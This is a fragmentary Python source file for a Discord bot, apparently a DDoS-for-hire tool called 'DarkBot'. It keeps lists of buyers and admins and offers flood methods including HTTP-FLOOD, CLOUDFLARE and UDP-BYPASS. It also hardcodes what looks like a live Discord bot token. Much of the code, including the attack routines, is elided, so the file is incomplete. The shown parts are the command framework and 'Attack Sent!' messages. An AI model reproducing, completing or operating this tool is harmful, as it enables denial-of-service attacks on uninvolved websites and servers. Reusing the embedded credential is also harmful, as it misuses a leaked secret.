__author__ = 'Darkness'
__version__ = '666.6'
__github__ = 'github.com/TheDarkness'
__license__ = 'GNU General Public License v6.66'
# DarkBot | Discord DDos Bot v6.6 |  DarknessTheGod
#=====Import Module=====#
...
buyers  = [1141615067075461131]  #          
admins  = [1141615067075461131]  #   ID users          
owners  = [1141615067075461131]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UDP-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTE4NjMyNDQxNTMzNjY5Nzg5Nw.Gx42MF.HPejEnGqAEEyQmTQg1qQHmisEqTVxdnssEFzeA' # paste your token here
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Darkness Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"Darkness Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
...
⠀
    ...
    print(banner)
    print('\033[1;97m+=============================================================+')
    print(f'\033[1;97m|Logged \033[1;96m{bot.user.name}                                  |')
    print(f'\033[1;97m|Bot ID: \033[1;97m{bot.user.id}                                  |')
    print('\033[1;97m+=============================================================+')
